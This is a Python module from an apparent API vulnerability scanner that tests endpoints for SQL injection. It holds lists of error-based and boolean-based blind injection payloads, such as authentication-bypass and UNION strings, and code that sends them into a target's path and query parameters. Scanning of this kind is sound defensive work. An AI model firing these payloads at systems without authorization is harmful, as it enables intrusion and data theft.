"""SQL Injection attack testing."""
import re
from typing import Dict, Any
from rico.executor.http_runner import run_request
from rico.attacks.detector import detect_vulnerability
import httpx


# Common SQL injection payloads (error-based)
SQL_PAYLOADS = [
    "' OR 1=1 --",
    "\" OR 1=1 --",
    "admin' --",
    "' OR 'a'='a",
    "1' OR '1'='1",
    "' UNION SELECT NULL--",
]

# Boolean-based blind SQL injection payload pairs
# Each pair contains a TRUE condition and FALSE condition
BOOLEAN_PAYLOADS = [
    {
        "true": "' AND 1=1--",
        "false": "' AND 1=2--",
        "description": "Basic boolean comparison"
    },
    {
        "true": "' AND 'a'='a'--",
        "false": "' AND 'a'='b'--",
        "description": "String equality comparison"
    },
    {
        "true": "\" AND \"x\"=\"x\"--",
        "false": "\" AND \"x\"=\"y\"--",
        "description": "Double-quote string comparison"
    },
]

# Database-specific boolean payloads
DB_SPECIFIC_BOOLEAN_PAYLOADS = {
    "MySQL": [
        {
            "true": "' AND SLEEP(0)=0--",
            "false": "' AND SLEEP(0)=1--",
            "description": "MySQL SLEEP function (no delay)"
        },
    ],
    "PostgreSQL": [
        {
            "true": "' AND 1::int=1--",
            "false": "' AND 1::int=2--",
            "description": "PostgreSQL type casting"
        },
    ],
    "MSSQL": [
        {
            "true": "' AND 1=1--",
            "false": "' AND 1=0--",
            "description": "MSSQL boolean comparison"
        },
    ],
}


async def test_sqli(
    endpoint: str,
    base_url: str,
    method: str = "GET",
    parameters: list = None
) -> Dict[str, Any]:
    """
    Test for SQL Injection vulnerability.
    
    This test injects SQL payloads into parameters and checks for:
    1. SQL error messages in responses (error-based)
    2. Boolean-based blind SQL injection (true/false comparison)
    3. Significant changes in response size/content
    4. Successful authentication bypass patterns
    
    Args:
        endpoint: Endpoint path
        base_url: Base URL of the API
        method: HTTP method to use
        parameters: List of endpoint parameters (optional)
        
    Returns:
        Dictionary with test results
    """
    result = {
        "attack_type": "SQL Injection",
        "endpoint": endpoint,
        "vulnerable": False,
        "confidence": 0,
        "details": "No SQL injection vulnerability detected"
    }
    
    # PHASE 3: Check if endpoint has injectable surface
    # Extract path parameters from endpoint
    path_params = re.findall(r'\{(\w+)\}', endpoint)
    
    # Check if endpoint has query parameters or path parameters
    has_injectable_surface = False
    
    # Check for path parameters
    if path_params:
        has_injectable_surface = True
    
    # Check for query parameters in endpoint definition
    if parameters:
        # Check if any parameter is query or path type
        for param in parameters:
            if isinstance(param, dict):
                param_in = param.get('in', '').lower()
                if param_in in ['query', 'path', 'body']:
                    has_injectable_surface = True
                    break
            elif isinstance(param, str):
                if 'query' in param.lower() or 'path' in param.lower() or 'body' in param.lower():
                    has_injectable_surface = True
                    break
    
    # Skip SQLi test for endpoints without injectable surface
    # Common non-injectable endpoints: /, /health, /status, /docs, /list
    non_injectable_patterns = [
        r'^/$',
        r'/health$',
        r'/status$',
        r'/version$',
        r'/docs?$',
        r'/swagger',
        r'/openapi',
        r'/list$',
        r'/info$',
    ]
    
    is_non_injectable = any(re.search(pattern, endpoint, re.IGNORECASE) for pattern in non_injectable_patterns)
    
    if is_non_injectable and not has_injectable_surface:
        result["confidence"] = 0
        result["details"] = "SQL Injection test NOT APPLICABLE (no injectable parameters)"
        return result
    
    # Build full URL
    url = base_url.rstrip('/') + endpoint
    
    try:
        # Get baseline response
        baseline_response = None
        baseline_status = 0
        baseline_time = 0.0
        try:
            baseline = await run_request(
                method=method,
                url=url.replace('{id}', '1') if '{id}' in url else url,
                timeout=5.0
            )
            baseline_response = baseline.response_text
            baseline_status = baseline.status_code
            baseline_time = baseline.response_time
        except Exception:
            baseline_response = None
            baseline_status = 0
            baseline_time = 0.0
        
        max_confidence = 0
        best_detection = None
        
        # Phase 1: Test error-based SQL injection payloads
        for payload in SQL_PAYLOADS[:3]:  # Limit to 3 payloads
            try:
                # Test in path parameters
                if path_params:
                    test_url = url
                    for param in path_params:
                        test_url = test_url.replace(f"{{{param}}}", payload)
                else:
                    # Test as query parameter
                    test_url = f"{url}?id={payload}"
                
                response = await run_request(
                    method=method,
                    url=test_url,
                    timeout=5.0
                )
                
                # Use detector for error-based analysis
                detection = detect_vulnerability(
                    attack_type="SQL Injection",
                    mode="error",
                    endpoint=endpoint,
                    baseline_response={
                        "status": baseline_status,
                        "text": baseline_response or "",
                        "time": baseline_time
                    },
                    test_response={
                        "status": response.status_code,
                        "text": response.response_text,
                        "time": response.response_time
                    },
                    additional_data={"payload": payload, "mode": "error"}
                )
                
                # Keep track of highest confidence detection
                if detection.confidence > max_confidence:
                    max_confidence = detection.confidence
                    best_detection = detection
                
            except (httpx.TimeoutException, httpx.ConnectError):
                # Skip this payload if request fails
                continue
            except Exception:
                continue
        
        # Phase 2: Test boolean-based blind SQL injection
        # Only test if error-based didn't find high-confidence vulnerability
        if max_confidence < 90:
            for boolean_pair in BOOLEAN_PAYLOADS[:2]:  # Limit to 2 boolean pairs
                try:
                    # Test TRUE payload
                    true_payload = boolean_pair["true"]
                    if path_params:
                        true_url = url
                        for param in path_params:
                            true_url = true_url.replace(f"{{{param}}}", true_payload)
                    else:
                        true_url = f"{url}?id={true_payload}"
                    
                    true_response = await run_request(
                        method=method,
                        url=true_url,
                        timeout=5.0
                    )
                    
                    # Test FALSE payload
                    false_payload = boolean_pair["false"]
                    if path_params:
                        false_url = url
                        for param in path_params:
                            false_url = false_url.replace(f"{{{param}}}", false_payload)
                    else:
                        false_url = f"{url}?id={false_payload}"
                    
                    false_response = await run_request(
                        method=method,
                        url=false_url,
                        timeout=5.0
                    )
                    
                    # Use detector for boolean-based analysis
                    detection = detect_vulnerability(
                        attack_type="SQL Injection",
                        mode="boolean",
                        endpoint=endpoint,
                        baseline_response={
                            "status": baseline_status,
                            "text": baseline_response or "",
                            "time": baseline_time
                        },
                        true_response={
                            "status": true_response.status_code,
                            "text": true_response.response_text,
                            "time": true_response.response_time
                        },
                        false_response={
                            "status": false_response.status_code,
                            "text": false_response.response_text,
                            "time": false_response.response_time
                        },
                        additional_data={
                            "true_payload": true_payload,
                            "false_payload": false_payload,
                            "description": boolean_pair["description"],
                            "mode": "boolean"
                        }
                    )
                    
                    # Keep track of highest confidence detection
                    if detection.confidence > max_confidence:
                        max_confidence = detection.confidence
                        best_detection = detection
                    
                except (httpx.TimeoutException, httpx.ConnectError):
                    # Skip this boolean pair if request fails
                    continue
                except Exception:
                    continue
        
        # Use best detection result
        if best_detection:
            result["vulnerable"] = best_detection.vulnerable
            result["confidence"] = best_detection.confidence
            result["details"] = best_detection.reason
        else:
            result["confidence"] = 0
            result["details"] = (
                f"No SQL injection detected. Tested {len(SQL_PAYLOADS[:3])} error-based "
                f"and {min(2, len(BOOLEAN_PAYLOADS))} boolean-based payloads."
            )
    
    except Exception as e:
        result["details"] = f"Error during SQL injection test: {str(e)}"
        result["confidence"] = 0
    
    return result
